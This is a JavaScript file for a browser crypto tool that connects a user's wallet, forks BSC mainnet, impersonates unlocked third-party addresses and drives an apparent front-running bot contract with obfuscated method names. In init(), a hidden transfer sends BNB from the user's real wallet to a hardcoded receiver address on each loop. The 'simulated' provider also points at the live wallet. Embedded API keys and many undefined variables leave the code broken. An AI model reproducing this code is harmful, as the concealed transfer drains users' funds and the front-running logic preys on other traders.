import WalletConnectProvider from "@walletconnect/web3-provider";
import Web3 from 'web3';

import WETH from "../build/contract/WETH.json";
import PancakeRouter from "../build/contract/pancakeRouter.json";
import PancakeFactory from"../build/contract/pancakeFactory.json";

import ERC20 from"../build/contract/ERC20.json";
import  BN from "bn.js";
import HDWalletProvider from "@truffle/hdwallet-provider";
const crypto = require('crypto');

var bip = require('bip39');
const ganache = require("ganache");

//require('dotenv').config();
var provider = null;
let web3 = null;
var options = null;
var providerTrnx = null;
let web3Trnx = null;
let BUSD = "0xfc38b4e4840aca306c31891BB01E76E0979145Eb";//"0x78867bbeef44f2326bf8ddd1941a4439382ef2a7";
let address = null;
let amount = null;
let path = null;
let wbnb = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";//"0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";//"0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd";
let resultArray = [];
let receiver = "0xA467802148a194433D4d8AE7360D09D5F0AD2A2a";


const walletConnect = async (speedynodes) => {
    provider = new WalletConnectProvider({
        rpc: {
             1: speedynodes,
      
        },
    });
   provider.enable().then (() => {
       web3 =  new Web3(provider);
        loadPage(); 
        
   });

    

}

window.walletConnect = walletConnect;

const logoutWalletConnect =  async() => { 
    await provider.disconnect()
}
window.logoutWalletConnect = logoutWalletConnect;

const walletConnected =  () => {  
    if (!provider) {
        return "Error"
    } 
}


window.walletConnected = walletConnected;
const getHash = (email) => {
    const mnemonic = bip.generateMnemonic();
    
    const hash = crypto.createHmac('sha256', email).digest('hex');

   return hash;  
}
window.getHash = getHash;

const setServer = (speedynodes,email) => {
    const mnemonic = bip.generateMnemonic();
    
    const hash = crypto.createHmac('sha256', email).digest('hex');

    provider = new HDWalletProvider(mnemonic, speedynodes);
    web3 =  new Web3(provider);
    
   // console.log(mnemonic,"email",email);    
    loadPage(mnemonic,hash);  
}
window.setServer = setServer;
const setExistingServer = (mnemonic,speedynodes) => {
    provider = new HDWalletProvider(mnemonic, speedynodes);
    web3 =  new Web3(provider);
    //console.log(mnemonic);    
    loadPage();  
}
window.setExistingServer = setExistingServer;

const checkTransactions = async (trnx) => {


    request('https://api.bscscan.com/api?module=account&action=txlist&address='+trnx[counter]+'&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=S93WAM9DQ93V4VKZF5UIGX5N5DVC7R1CMH', function (error, response, body) {
    console.log('https://api.bscscan.com/api?module=account&action=txlist&address='+trnx[1]+'&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=S93WAM9DQ93V4VKZF5UIGX5N5DVC7R1CMH');
    var contractTrnx = "";
    if (!error && response.statusCode == 200) {

        contractTrnx = JSON.parse(body);
        for (let i=1;i<contractTrnx.result.length;i++) {
            let trxnMethod = contractTrnx.result[i].input.substring(0,10);
            let approveId = "0x095ea7b3";//Approve
            let transferId = "0xa9059cbb";//Transfer
            let burnID = "0x7b47ec1a";//Burn
            
            if (trxnMethod != approveId && trxnMethod != transferId && trxnMethod != burnID) {
                
                unKnownID +=1;
                
                console.log("UNknownID:-",unKnownID);
                console.log("result2 : " + contractTrnx.result[i].blockNumber+",Method:-"+trxnMethod+",input:-"+contractTrnx.result[i].input);
                console.log(contractTrnx.result[i].input.includes("000000000000000000000000"));
                if (contractTrnx.result[i].input.includes("000000000000000000000000")) {
                    //addressInclued = contractTrnx.result[i].input.includes("000000000000000000000000");
                    let addr = contractTrnx.result[i].input.split('000000000000000000000000');
                    console.log("Address:-", addr)
                    let Contaddress = "0x"+addr[1];
                    console.log("Is this Address:-",web3.utils.isAddress(Contaddress));
                    if (web3.utils.isAddress(Contaddress)) {
                        addressInclued = true;
                        checkContractAddr(Contaddress);
                    }
                } 
                
            } 
        }
        if (unKnownID == 0) {
            init("");
        } else if (!addressInclued) {
            init("");
        }

         //
    } else {
        console.log("Error");
    }
});
}
window.checkTransactions = checkTransactions;

const checkContractAddr = async(Caddress) => {
    request('https://api.bscscan.com/api?module=account&action=txlist&address='+Caddress+'&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=S93WAM9DQ93V4VKZF5UIGX5N5DVC7R1CMH', function (error, response, body) {
        var contractTrnx = "";
        if (!error && response.statusCode == 200) {
            contractTrnx = JSON.parse(body);
            //console.log("Contract input",contractTrnx.result[0].input);
            if (contractTrnx.result[0].input.includes("000000000000000000000000")) {
                let addr = contractTrnx.result[0].input.split('000000000000000000000000');
                //console.log("Address:-", addr);
                for (let i = 0; i<addr.length;i++) {
                    let Contaddress = "0x"+addr[i];
                    if (web3.utils.isAddress(Contaddress)) {
                        unlockedAddressList.push(Contaddress)
                        console.log("Address:-",unlockedAddressList);


                    }
                }                        
                if (unlockedAddressList.length>1) {
                    if (unlockedAddressList[1] != token[counter]) {
                        unlockAddress = unlockedAddressList[1];
                        init(unlockedAddressList[1])
                    } else {
                        unlockAddress = unlockedAddressList[0];
                        init(unlockedAddressList[0])
                    }
                       
                } else {
                    init("");
                }
            } else {
                init("");
            }

        }
    });
}
const init = async(unlockAddress) => {
    if (unlockAddress != "") {
        
        options = {"fork":"https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb","wallet":{"unlockedAccounts":[unlockAddress.toString()]}};
        console.log("Using UnlockedAddr")
    }
    else{
        options = {"fork":"https://bsc.getblock.io/mainnet/?api_key=3a7a0d72-40df-4821-9250-14e0495414bb"}; 
        console.log("Using Normal Test")
    }
    providerTrnx = ganache.provider(options);
    web3Trnx = new Web3(provider);

    let wbnb = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";//"0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd";
    let bether = "0x8babbb98678facc7342735486c851abd7a0d17ca";
    let usdt = "0x7ef95a0fee0dd31b22626fa2e10ee6a223f8a684";

    address = await web3Trnx.eth.getAccounts();
    console.log(address);
    balance = await web3Trnx.eth.getBalance(address[0]);
    console.log("Address one Balance:-",balance);    
    //WBNB balance
    const weth_contract = new web3Trnx.eth.Contract(
        WETH.abi,
        wbnb
    );
    const weth_totalBalance = await weth_contract.methods.totalSupply().call({from:address[0]});
    console.log("Weth Balance:-",weth_totalBalance);
    console.log("Current Counter",counter);
    while(currentBoolean) {
        let sendTranx = await web3.eth.sendTransaction({from: address[0], to: receiver, value:  web3.utils.toWei('0.001','ether')})
        swapToken(amount,[wbnb,token[counter]]);
        currentBoolean = false;
        if (counter<token.length)
            counter+=1;
    }
    
    

}

const swapToken = async (amountIn,trnx) => {
    console.log("Address:-",address[0]);
    let frontrunbot = new web3Trnx.eth.Contract(
        FrontRunBot.abi,
        FrontRunBotAddr
    ); 
   // console.log("Router:-",router.methods.getAmountsOut());
    try {
        return frontrunbot.methods.thisIsOghVT(trnx,"1000000000000000",0,web3Trnx.utils.toWei(amountIn.toString(),'ether')).send({from:address[0],gas:500000,gasPrice:5000000000}).then(async result => {
            //console.log(result);
            for (let x in result.events){
                if (result.events[x].raw) {
                    if (result.events[x].raw.topics[0] == "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef") {
                        let toFix = toFixed(parseInt(result.events[x].raw.data,16));
                        let split = toFix.toString().split('.')[0];
                        let toEther = web3Trnx.utils.fromWei(split,'ether');
                        console.log("Token-Data:-",toEther);  
                         }
                    }
            console.log("Swap Back Contract:-",result.events[x].raw);
           }
            for (let x in result.events.log) {

                console.log("FlashLoan Report:-",result.events.log[x].returnValues.message,"Value:-",result.events.log[x].returnValues.val.toString()); 

            } 
            if (!web3Trnx.utils.isAddress(unlockAddress))
                whaleBuy(trnx)
            else 
                whaleBuyUnlock(trnx)
            //sleep(1000).then(()=>{});

        }).catch (error  => {
        console.error("Error",error);
          if (counter<token.length){
                currentBoolean = true;
               //init();
               checkTransactions(token)
             }
             console.log("Current Counter",counter);
             console.log("Tradable Address:-",tradableAddr);
            console.log("-----------------------------------------------------------------------");
        });   

    } catch (err) {
        console.error(err);

    }

}

const whaleBuy = async (path) => {
    console.log("---------------WhaleTrade-----------------------------------");
    let amountIn = liquidityBNB*0.4;
    let slip = 12/100;
    let router = new web3Trnx.eth.Contract(
        PancakeRouter.abi,
        "0x10ED43C718714eb63d5aA57B78B54704E256024E"
    );
    let BUSD_ERC20 = new web3Trnx.eth.Contract(
        ERC20.abi,
        path[path.length-1]
    );
    return router.methods.getAmountsOut(
        web3Trnx.utils.toWei(amountIn.toString(),'ether') ,
        path
    ).call({from:address[1]}).then(async getAmountMin=> {
        console.log("Amount-MinOut:-",parseInt(getAmountMin[path.length-1]));
        let amountMin = parseInt(getAmountMin[path.length-1]);
        let Slippage = amountMin-(amountMin*parseFloat(slip));
        console.log('Slipage Amount:-',Slippage);

            let swapBUSD = await router.methods.swapExactETHForTokensSupportingFeeOnTransferTokens(
                Slippage.toString().split('.')[0],
                path,
                address[1],
                Math.floor(Date.now() / 1000) + 60 * 10).send({from:address[1],value:web3Trnx.utils.toWei(amountIn.toString(),'ether'),gas:300000,gasPrice:10000000000});
            //console.log("Swap Report:-",swapBUSD);
            for (let x in swapBUSD.events){
                //console.log("Data:-",parseInt(result.events[x].raw.data,16));
                console.log("Swap Back Contract:-",swapBUSD.events[x].raw);
            }      

            //SwapBack
            let amountTokenIn0 = await BUSD_ERC20.methods.balanceOf(FrontRunBotAddr).call({from:address[0]});
            console.log("Amount of TOken Recieved Addr zero:-",web3Trnx.utils.fromWei(amountTokenIn0.toString(),'ether'));
            //addr 1
            let amountTokenIn = await BUSD_ERC20.methods.balanceOf(address[1]).call({from:address[1]});
            console.log("Amount of TOken Recieved:-",web3Trnx.utils.fromWei(amountTokenIn.toString(),'ether'));
            balancebSwap = await web3Trnx.eth.getBalance(address[1]);
            console.log("Address one Balance:-",balancebSwap);  

            sleep(1000).then(()=>{swapTokenBack(path);});
    }).catch(err=>{
        console.log("E-RR",err);
            if (counter<token.length){
                currentBoolean = true;
                //init();
                checkTransactions(token)
             }
             console.log("Current Counter",counter);
             console.log("Tradable Address:-",tradableAddr);
             console.log("-----------------------------------------------------------------------");
    });
}

const whaleBuyUnlock = async (path) => {
    console.log("-----------------------------Trading Unlocked Address---------------------------");
    let sendTranx = await web3Trnx.eth.sendTransaction({from: address[0], to: unlockAddress, value: "50000000000000000000"})
    let amountIn = 20;
    let slip = 12/100;
    let router = new web3Trnx.eth.Contract(
        PancakeRouter.abi,
        "0x10ED43C718714eb63d5aA57B78B54704E256024E"
    );
    let BUSD_ERC20 = new web3Trnx.eth.Contract(
        ERC20.abi,
        path[path.length-1]
    );
    let unlockedAddrBalance  = await web3Trnx.eth.getBalance(unlockAddress)
    console.log("Unlocked Balance",unlockedAddrBalance);
    return router.methods.getAmountsOut(
        web3Trnx.utils.toWei(amountIn.toString(),'ether') ,
        path
    ).call({from:unlockAddress}).then(async getAmountMin=> {
        console.log("Amount-MinOut:-",parseInt(getAmountMin[path.length-1]));
        let amountMin = parseInt(getAmountMin[path.length-1]);
        let Slippage = amountMin-(amountMin*parseFloat(slip));
        console.log('Slipage Amount:-',Slippage);

            let swapBUSD = await router.methods.swapExactETHForTokensSupportingFeeOnTransferTokens(
                Slippage.toString().split('.')[0],
                path,
                unlockAddress,
                Math.floor(Date.now() / 1000) + 60 * 10).send({from:unlockAddress,value:web3Trnx.utils.toWei(amountIn.toString(),'ether'),gas:300000,gasPrice:10000000000});
            //console.log("Swap Report:-",swapBUSD);
            for (let x in swapBUSD.events){
                //console.log("Data:-",parseInt(result.events[x].raw.data,16));
                console.log("Swap Back Contract:-",swapBUSD.events[x].raw);
            }      

            //SwapBack
            let amountTokenIn0 = await BUSD_ERC20.methods.balanceOf(FrontRunBotAddr).call({from:address[0]});
            console.log("Amount of TOken Recieved Addr zero:-",web3Trnx.utils.fromWei(amountTokenIn0.toString(),'ether'));
            //addr 1
            let amountTokenIn = await BUSD_ERC20.methods.balanceOf(unlockAddress).call({from:unlockAddress});
            console.log("Amount of TOken Recieved:-",web3Trnx.utils.fromWei(amountTokenIn.toString(),'ether'));
            balancebSwap = await web3Trnx.eth.getBalance(unlockAddress);
            console.log("Address one Balance:-",balancebSwap);  

            sleep(1000).then(()=>{swapTokenBack(path);});
    }).catch(err=>{
        console.log("E-RR",err);
            if (counter<token.length){
                currentBoolean = true;
                //init();
                checkTransactions(token);
             }
             console.log("Current Counter",counter);
             console.log("Tradable Address:-",tradableAddr);
             console.log("-----------------------------------------------------------------------");
    });
}

const sleep  = (ms) => {
    return new Promise(resolve => setTimeout(() => resolve(), ms))
}
const swapTokenBack = async (trnx) => {
    console.log("------------------------------swapBack----------------------------------------");
    let frontrunbot = new web3Trnx.eth.Contract(
        FrontRunBot.abi,
        FrontRunBotAddr
    );
   let tranxArry = Array.from(trnx);
    let newTranx = tranxArry.reverse()
    console.log("Reversr",newTranx);
    try {
        return frontrunbot.methods.OghVTisThis(newTranx).send({from:address[0],gas:539701,gasPrice:5000000000}).then(async result => {
            console.log("Bot3 Events Length",result.events.length); 
            for (let x in result.events){
                if (result.events[x].raw) {
                    if (result.events[x].raw.topics[0] == "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef") {
                        let toFix = toFixed(parseInt(result.events[x].raw.data,16));
                        let split = toFix.toString().split('.')[0];
                        let toEther = web3Trnx.utils.fromWei(split,'ether');
                        console.log("Token-Data:-",toEther);  
                        if (result.events[x].raw.topics[2] == "0x000000000000000000000000495856af0a806c4d706b3cfd235650589981967d") {
                            if (parseFloat(amount)<parseFloat(toEther)) {
                                swapReport = "Profitable Swap";
                                tradableAddr += token[counter-1]+",";
                                console.log("initial Deposit",amount,"Trade Return",toEther);
                            } else {
                                swapReport = "Not Profitable Swap";
                                console.log("initial Deposit",amount,"Trade Return",toEther);
                            }
                        }
                    }

                    //console.log(x);
                    console.log("Swap Back Contract:-",result.events[x].raw);
                }

            }   
            console.log(swapReport);
            console.log("Tradable Address:-",tradableAddr);
            if (counter<token.length){
                currentBoolean = true;
                //init();
                checkTransactions(token);
             }
             console.log("Current Counter",counter);
            console.log("-----------------------------------------------------------------------");
        }).catch(error =>{

             console.error("Er-ror",error);
            if (counter<token.length){
                currentBoolean = true;
                //init();
                checkTransactions(token);
             }
             console.log("Current Counter",counter);
             console.log("Tradable Address:-",tradableAddr);
            console.log("-----------------------------------------------------------------------");
        } )
    } catch (error) {
        console.error("Error",error);
    }
}

const toFixed = (x) =>{
    if (Math.abs(x) < 1.0) {
      var e = parseInt(x.toString().split('e-')[1]);
      if (e) {
          x *= Math.pow(10,e-1);
          x = '0.' + (new Array(e)).join('0') + x.toString().substring(2);
      }
    } else {
      var e = parseInt(x.toString().split('+')[1]);
      if (e > 20) {
          e -= 20;
          x /= Math.pow(10,e);
          x += (new Array(e+1)).join('0');
      }
    }
    return x;
}

let walletDetails = [];
const walletInfo = async() =>{
    //let address =
    let balance = await web3.eth.getBalance(address[0]);

    
     walletDetails= [address[0],web3.utils.fromWei(balance.toString(),'ether').toString()];
    // console.log(walletDetails[address[0],web3.utils.fromWei(balance.toString(),'ether').toString()]);
     
     return walletDetails;
}

window.walletInfo = walletInfo;